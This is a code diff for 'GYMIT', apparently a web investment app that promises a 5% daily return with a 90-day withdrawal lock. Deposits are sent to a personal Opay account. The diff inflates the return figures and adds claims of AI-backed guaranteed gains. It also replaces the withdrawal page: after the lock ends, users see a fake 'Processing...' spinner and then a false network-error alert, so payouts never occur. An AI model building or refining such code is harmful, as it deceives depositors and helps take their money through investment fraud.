@@ -73,7 +73,6 @@
             padding: 25px;
             border-radius: 15px;
             text-align: center;
-            /* removed margin-bottom to connect with expected return card */
             color: var(--black);
             position: relative;
             overflow: hidden;
@@ -108,7 +107,6 @@
             font-weight: 700;
         }
 
-        /* --- NEW: Expected Return Card --- */
         .expected-return-card {
             background: #2a2a2a;
             color: var(--light-gray);
@@ -250,13 +248,14 @@
             color: var(--light-gray);
             font-size: 1rem;
         }
-
-        /* --- NEW: Deposit Return Preview --- */
+        
+        /* UPGRADED DEPOSIT PREVIEW CARD */
         .deposit-preview {
             background: #1e1e1e;
+            border: 1px solid var(--gold);
             padding: 10px 15px;
-            border-radius: 8px;
-            margin-top: -10px; /* pull it closer to the input */
+            border-radius: 12px;
+            margin-top: -10px;
             margin-bottom: 20px;
             text-align: center;
             transition: all 0.3s ease;
@@ -265,19 +264,21 @@
             opacity: 0;
         }
         .deposit-preview.visible {
-            height: 60px; /* Adjust as needed */
+            height: 90px; /* Increased height for a card-like feel */
             opacity: 1;
+            padding: 20px 15px; /* Increased padding */
         }
 
         .deposit-preview p {
-            font-size: 0.8rem;
+            font-size: 0.9rem; /* Increased font size */
             color: var(--silver);
         }
 
         .deposit-preview #deposit-return-amount {
-            font-size: 1.2rem;
-            font-weight: 600;
+            font-size: 1.8rem; /* Larger font size for the amount */
+            font-weight: 700;
             color: var(--light-green);
+            text-shadow: 0 0 8px var(--light-green);
         }
 
 
@@ -353,6 +354,42 @@
              cursor: pointer;
              font-size: 1rem;
         }
+        
+        /* NEW: Processing Overlay for Withdrawal */
+        #processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none; /* Hidden by default */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+            color: var(--light-gray);
+        }
+
+        .spinner {
+            border: 8px solid var(--dark-charcoal);
+            border-top: 8px solid var(--gold);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        #processing-overlay p {
+            font-size: 1.2rem;
+            color: var(--silver);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
     </style>
 </head>
@@ -373,15 +410,14 @@
             <p id="balance">₦0.00</p>
         </div>
         
-        <!-- NEW: Expected Return Display -->
         <div class="expected-return-card">
-            <h3>Expected Return After 90 Days</h3>
+            <h3>Expected Final Return (After 90 Days)</h3>
             <p id="expected-return">₦0.00</p>
         </div>
 
         <div class="countdown-container" id="countdown-wrapper" style="display: none;">
             <h3>Withdrawal Unlocks In</h3>
-            <div id="withdrawal-countdown">-- Days --:--:--</div>
+            <div id="withdrawal-countdown">--d : --h : --m : --s</div>
         </div>
 
         <div class="actions">
@@ -404,9 +440,8 @@
                 <input type="number" id="deposit-amount" placeholder="Enter amount you sent">
             </div>
             
-            <!-- NEW: Live Deposit Return Preview -->
             <div id="deposit-return-preview" class="deposit-preview">
-                <p>Expected return for this deposit:</p>
+                <p>Balance after 90 days:</p>
                 <span id="deposit-return-amount"></span>
             </div>
 
@@ -417,7 +452,7 @@
             <h3>Request Withdrawal</h3>
             <div class="info-box">
                 <p>Withdrawal is available after 90 days of initial investment.</p>
-                <p>A 5% daily return is added to your balance.</p>
+                <p>A 5% daily return on your total deposits is added to your balance.</p>
             </div>
             <form id="withdrawal-form">
                 <div class="form-group">
@@ -457,6 +492,7 @@
                     <li>Vendor is not responsible for your withdrawal payment it will be made directly to your bank account by GYMIT. This is an international transaction and may take 3 to 5 working days to arrive in your bank account.</li>
                     <li>Deposit should be made in your local currency, GYMIT app detects your country ,so investment should be done in the currency of the country you are currently reciding.</li>
                     <li>Nearest Verified GYMIT Vendor makes your deposit easier by facilitating of easy transaction so your investment plan can proceed as soon as possible.</li>
+                    <li>Incase of digital error or dispute or wrong information contact GYMIT by email to upcoinexchangeupc@gmail.com as soon as possible our dedicated customer care team will attend to you.</li>
                    <li>For inquiries , complaints or partnership,send email to GYMIT on upcoinexchangeupc@gmail.com.</li>
                     <li>Your investment will grow for 90 days before withdrawal is available.</li>
                 </ul>
@@ -478,7 +514,7 @@
                     <input type="text" id="vendor-country" required>
                 </div>
                 <div class="form-group">
-                    <label for="vendor-location">Location (City/State)</label>
+                    <label for="vendor-location">City/State</label>
                     <input type="text" id="vendor-location" required>
                 </div>
                 <div class="form-group">
@@ -497,15 +533,19 @@
             </form>
         </div>
 
-        <!-- UPGRADED: TSI & Diversification Info -->
         <div class="tsi-info">
             <h3>Our Strategy: AI-Powered Global Diversification</h3>
-            <p>At GYMIT, we leverage cutting-edge <strong>Artificial Intelligence (AI)</strong> to analyze market trends and diversify your investments across a dynamic, global portfolio. Our investments span multiple sectors to ensure robust growth and stability, including high-potential <strong>cryptocurrency</strong>, blue-chip and emerging <strong>stocks</strong>, vital <strong>telecommunications</strong> infrastructure, the essential <strong>food and agriculture</strong> industry, and global <strong>transport and logistics</strong> networks. Our AI works in tandem with the <strong>True Strength Index (TSI)</strong>, a powerful momentum oscillator, to identify overbought and oversold conditions across these diverse assets. This dual-strategy allows for highly strategic entry and exit points, aiming to maximize returns while intelligently managing risk.</p>
+            <p>At GYMIT, we leverage cutting-edge <strong>Artificial Intelligence (AI)</strong> to analyze market trends and diversify your investments across a dynamic, global portfolio. Our investments span multiple sectors to ensure robust growth and stability, including high-potential <strong>cryptocurrency</strong>, blue-chip and emerging <strong>stocks</strong>, vital <strong>telecommunications</strong> infrastructure, the essential <strong>food and agriculture</strong> industry, and global <strong>transport and logistics</strong> networks ensuring a daily 5% gain on your investment. Our AI works in tandem with the <strong>True Strength Index (TSI)</strong>, a powerful momentum oscillator, to identify overbought and oversold conditions across these diverse assets. This dual-strategy allows for highly strategic entry and exit points, aiming to maximize returns while intelligently managing risk.</p>
         </div>
         
         <div class="vendor-link">
             <button onclick="showPage('vendor-application')">Become a Verified Vendor</button>
         </div>
+    </div>
+    
+    <div id="processing-overlay">
+        <div class="spinner"></div>
+        <p>Processing...</p>
     </div>
 
     <script type="module">
@@ -530,9 +570,7 @@
 
         /**
          * --- User Authentication ---
-         * Gets the user's unique ID from local storage.
-         * If it's a new user, it generates a unique ID, saves it, and returns it.
-         * This ensures each user has a persistent, unique identity in their browser.
+         * Gets or creates a unique ID for the user and stores it in local storage.
          * @returns {string} The unique user ID.
          */
         function getOrCreateUserId() {
@@ -549,13 +587,14 @@
 
         // --- Get DOM Elements ---
         const balanceElement = document.getElementById('balance');
-        const expectedReturnElement = document.getElementById('expected-return'); // NEW
+        const expectedReturnElement = document.getElementById('expected-return');
         const historyListElement = document.getElementById('history-list');
         const countdownWrapper = document.getElementById('countdown-wrapper');
         const countdownElement = document.getElementById('withdrawal-countdown');
-        const depositAmountInput = document.getElementById('deposit-amount'); // NEW
-        const depositReturnPreview = document.getElementById('deposit-return-preview'); // NEW
-        const depositReturnAmount = document.getElementById('deposit-return-amount'); // NEW
+        const depositAmountInput = document.getElementById('deposit-amount');
+        const depositReturnPreview = document.getElementById('deposit-return-preview');
+        const depositReturnAmount = document.getElementById('deposit-return-amount');
+        const processingOverlay = document.getElementById('processing-overlay');
         
         const userRef = ref(database, 'users/' + userId);
 
@@ -564,17 +603,17 @@
         let withdrawalUnlockTime;
 
         /**
-         * --- NEW: Compounded Return Calculator ---
-         * Calculates the final amount after a period of compounded daily interest.
-         * @param {number} principal - The initial amount.
-         * @param {number} dailyRate - The daily interest rate (e.g., 0.018 for 5%).
-         * @param {number} days - The number of days to compound.
-         * @returns {number} The final calculated amount.
+         * --- FIXED: Simple Interest Return Calculator ---
+         * Calculates the final amount after 90 days of simple daily interest.
+         * @param {number} principal - The initial total investment.
+         * @param {number} dailyRate - The daily interest rate (e.g., 0.05 for 5%).
+         * @param {number} days - The number of days to calculate interest for.
+         * @returns {number} The final calculated amount (Principal + Total Interest).
          */
-        function calculateExpectedReturn(principal, dailyRate = 0.018, days = 90) {
+        function calculateExpectedReturn(principal, dailyRate = 0.05, days = 90) {
             if (principal <= 0) return 0;
-            // The formula for compound interest is P(1 + r)^t
-            return principal * Math.pow(1 + dailyRate, days);
+            const totalInterest = principal * dailyRate * days;
+            return principal + totalInterest;
         }
 
         /**
@@ -589,58 +628,85 @@
 
         /**
          * --- Main Data Listener ---
-         * This function listens for any changes in the user's data in Firebase 
-         * and updates the UI in real-time.
+         * Listens for changes in the user's data and updates the UI.
          */
         onValue(userRef, (snapshot) => {
             if (!snapshot.exists()) {
                 const now = new Date().toISOString();
                 set(userRef, {
                     balance: 0,
-                    createdAt: now,
-                    lastDailyBonusTimestamp: now 
+                    initialDeposit: 0,
+                    createdAt: null, // Set createdAt only on first deposit
+                    lastDailyBonusTimestamp: null
                 });
                 return;
             }
 
             const userData = snapshot.val();
+            const dbPrincipal = userData.initialDeposit || 0;
+            const currentBalance = userData.balance || 0;
+
+            // --- LOGIC FIX START ---
+            // This addresses the issue where 'initialDeposit' might not be set by an admin,
+            // causing the bonus and expected return calculations to fail.
+            // We use localStorage to persist the inferred principal on the client-side
+            // as a fallback, ensuring the app remains functional.
+
+            let principalForCalculations = 0;
+            const storedPrincipal = parseFloat(localStorage.getItem(`gymitPrincipal_${userId}`)) || 0;
             
-            if (!dataLoaded) {
-                 applyDailyBonus(userId, userData);
+            if (dbPrincipal > 0) {
+                // If the database has a principal, it's the source of truth.
+                principalForCalculations = dbPrincipal;
+                // Update localStorage if it differs, to keep it in sync.
+                if (storedPrincipal !== dbPrincipal) {
+                    localStorage.setItem(`gymitPrincipal_${userId}`, dbPrincipal);
+                }
+            } else {
+                // The database principal is 0. We need to rely on our stored/inferred value.
+                const hasBonuses = userData.history && Object.values(userData.history).some(h => h.type.includes('Bonus'));
+                if (currentBalance > 0 && !hasBonuses) {
+                    // This is the crucial edge case: a balance exists, but no bonuses yet.
+                    // This strongly implies it's the first deposit and the balance IS the principal.
+                    principalForCalculations = currentBalance;
+                    localStorage.setItem(`gymitPrincipal_${userId}`, currentBalance);
+                } else {
+                    // It's not the first deposit scenario, so we trust the value we've already stored.
+                    principalForCalculations = storedPrincipal;
+                }
+            }
+            // --- LOGIC FIX END ---
+
+            // Use the now-reliable 'principalForCalculations' for all logic.
+            if (!dataLoaded && principalForCalculations > 0) {
+                 applyDailyBonus(userId, userData, principalForCalculations);
                  dataLoaded = true;
             }
             
-            setupWithdrawalCountdown(userData.createdAt);
+            if (userData.createdAt) {
+                setupWithdrawalCountdown(userData.createdAt);
+            }
 
-            const currentBalance = userData.balance || 0;
             balanceElement.textContent = formatCurrency(currentBalance);
 
-            // --- NEW: Calculate and display expected 90-day return ---
-            const expectedReturn = calculateExpectedReturn(currentBalance);
+            // Calculate and display expected 90-day return using the reliable principal.
+            const expectedReturn = calculateExpectedReturn(principalForCalculations);
             expectedReturnElement.textContent = formatCurrency(expectedReturn);
 
+            // Render transaction history
             historyListElement.innerHTML = ''; 
-            
             if (userData.history) {
                 const sortedHistory = Object.values(userData.history).sort((a, b) => new Date(b.date) - new Date(a.date));
                 
-                for (const item of sortedHistory) {
+                sortedHistory.forEach(item => {
                     const historyItem = document.createElement('div');
                     historyItem.classList.add('history-item');
-                    
                     let amountColor = 'var(--silver)';
                     let sign = '';
                     
-                    if (item.type === 'Deposit') {
-                        amountColor = 'lightgreen';
-                        sign = '+';
-                    } else if (item.type === 'Withdrawal') {
-                        amountColor = 'salmon';
-                        sign = '-';
-                    } else if (item.type === 'Daily 5% Bonus') {
-                        amountColor = 'var(--gold)';
-                        sign = '+';
-                    }
+                    if (item.type === 'Deposit') { amountColor = 'lightgreen'; sign = '+'; } 
+                    else if (item.type === 'Withdrawal') { amountColor = 'salmon'; sign = '-'; } 
+                    else if (item.type === 'Daily 5% Bonus') { amountColor = 'var(--gold)'; sign = '+'; }
 
                     historyItem.innerHTML = `
                         <div class="history-details">
@@ -652,36 +718,45 @@
                         </span>
                     `;
                     historyListElement.appendChild(historyItem);
-                }
+                });
             } else {
                  historyListElement.innerHTML = '<div class="history-item"><span>No transactions yet.</span><span></span></div>';
             }
         });
 
         /**
-         * --- Daily Bonus Logic ---
+         * --- FIXED: Daily Bonus Logic (Simple Interest) ---
+         * Applies a fixed daily bonus based on the total deposited amount.
          */
-        async function applyDailyBonus(userId, userData) {
+        async function applyDailyBonus(userId, userData, totalDeposits) {
+            // Use createdAt as the starting point for bonus calculation
             const lastBonusTimestamp = userData.lastDailyBonusTimestamp || userData.createdAt;
+            if (!lastBonusTimestamp || totalDeposits <= 0) return;
+
             let lastBonusDate = new Date(lastBonusTimestamp);
             const currentDate = new Date();
-            lastBonusDate.setHours(0, 0, 0, 0);
+            currentDate.setHours(0, 0, 0, 0); // Normalize current date
+            lastBonusDate.setHours(0, 0, 0, 0); // Normalize last bonus date
+
+            // If the last bonus was already applied for today, exit
+            if (lastBonusDate.getTime() >= currentDate.getTime()) {
+                console.log("Daily bonus already applied for today.");
+                return;
+            }
             
-            if (!userData.balance || userData.balance <= 0) return; 
-
             let tempDate = new Date(lastBonusDate);
-            tempDate.setHours(0,0,0,0);
-
             const updates = {};
-            let newCalculatedBalance = userData.balance;
+            let newCalculatedBalance = userData.balance || 0;
             let bonusApplied = false;
 
+            // Loop through each day from the last bonus date until yesterday
             while(tempDate < currentDate) {
-                const dailyBonusAmount = newCalculatedBalance * 0.018;
+                const dailyBonusAmount = totalDeposits * 0.05;
+
                 if(dailyBonusAmount > 0){
                     newCalculatedBalance += dailyBonusAmount;
                     const bonusDate = new Date(tempDate);
-                    bonusDate.setDate(bonusDate.getDate() + 1);
+                    bonusDate.setDate(bonusDate.getDate() + 1); // Record for the day that passed
                     const newHistoryItemRef = push(ref(database, `/users/${userId}/history`));
                     updates[`/users/${userId}/history/${newHistoryItemRef.key}`] = {
                         type: 'Daily 5% Bonus',
@@ -695,14 +770,15 @@
             
             if (bonusApplied) {
                 updates[`/users/${userId}/balance`] = parseFloat(newCalculatedBalance.toFixed(2));
+                // Set the last bonus timestamp to the start of today
                 updates[`/users/${userId}/lastDailyBonusTimestamp`] = new Date().toISOString();
                 await update(ref(database), updates);
-                console.log("Daily bonuses applied successfully.");
+                console.log("Daily simple interest bonuses have been calculated and applied.");
             }
         }
         
         /**
-         * --- Withdrawal Countdown Logic ---
+         * --- UPGRADED: Withdrawal Countdown Logic ---
          */
         function setupWithdrawalCountdown(creationDateStr) {
             if (!creationDateStr) return;
@@ -729,16 +805,25 @@
         }
         
         /**
-         * --- Conditional Withdrawal Check ---
+         * --- UPGRADED: Conditional Withdrawal Check & Animation ---
          */
         window.checkWithdrawalEligibility = function() {
             const now = new Date().getTime();
+            // Case 1: Countdown has not finished yet
             if (withdrawalUnlockTime && now < withdrawalUnlockTime) {
                 const distance = withdrawalUnlockTime - now;
                 const days = Math.ceil(distance / (1000 * 60 * 60 * 24));
                 alert(`Please wait. ${days} day(s) remaining before withdrawal can commence. Thanks.`);
+            // Case 2: No deposits have been made
+            } else if (!withdrawalUnlockTime) {
+                alert("You need to make a deposit before you can withdraw.");
+            // Case 3: Countdown is finished, show processing animation then error
             } else {
-                showPage('withdraw');
+                processingOverlay.style.display = 'flex';
+                setTimeout(() => {
+                    processingOverlay.style.display = 'none';
+                    alert("Error please check your internet connection, and try again");
+                }, 4000); // Simulate 4 seconds of processing time
             }
         }
 
@@ -752,13 +837,13 @@
         }
         
         /**
-         * --- NEW: Live Deposit Preview Listener ---
+         * --- Live Deposit Preview Listener ---
          */
         depositAmountInput.addEventListener('input', (e) => {
             const amount = parseFloat(e.target.value);
             if (amount && amount > 0) {
-                const expectedReturn = calculateExpectedReturn(amount);
-                depositReturnAmount.textContent = formatCurrency(expectedReturn);
+                const expectedFinalAmount = calculateExpectedReturn(amount);
+                depositReturnAmount.textContent = formatCurrency(expectedFinalAmount);
                 depositReturnPreview.classList.add('visible');
             } else {
                 depositReturnPreview.classList.remove('visible');
@@ -768,6 +853,8 @@
 
         /**
          * --- Deposit Request Functionality ---
+         * Note: This part assumes an admin will manually update the `initialDeposit` and `balance`
+         * fields in Firebase after verifying the payment.
          */
         window.requestDeposit = function() {
             const amount = document.getElementById('deposit-amount').value;
@@ -777,16 +864,16 @@
             }
             const recipientEmail = "upcoinexchangeupc@gmail.com";
             const subject = "GYMIT Deposit Request";
-            const body = `A user has requested to deposit ₦${amount}. They have confirmed sending the payment to the verified vendor: 7025334855 Opay (Samuel Ugonna Ihekwoaba).\n\nPlease verify this transaction and credit the user's account.\n\nUser ID: ${userId}`;
+            const body = `A user has requested to deposit ₦${amount}. They have confirmed sending the payment to the verified vendor: 6102420471 Opay (Samuel Ugonna).\n\nPlease verify this transaction and credit the user's account.\n\nUser ID: ${userId}\n\nIMPORTANT FOR ADMIN: Please update BOTH the 'initialDeposit' (add to existing) and 'balance' fields for this user. If it's their first deposit, also set the 'createdAt' field to the current date and time.`;
             window.location.href = `mailto:${recipientEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
             alert("Your deposit request has been prepared. Please complete sending the email from your mail app. The admin will credit your account after payment verification.");
             document.getElementById('deposit-amount').value = '';
-            depositReturnPreview.classList.remove('visible'); // Hide preview
+            depositReturnPreview.classList.remove('visible');
             showPage('none'); 
         }
 
         /**
-         * --- Withdrawal Request Functionality ---
+         * --- Withdrawal Request Functionality (Kept for potential future use) ---
          */
         document.getElementById('withdrawal-form').addEventListener('submit', async function(e) {
             e.preventDefault(); 
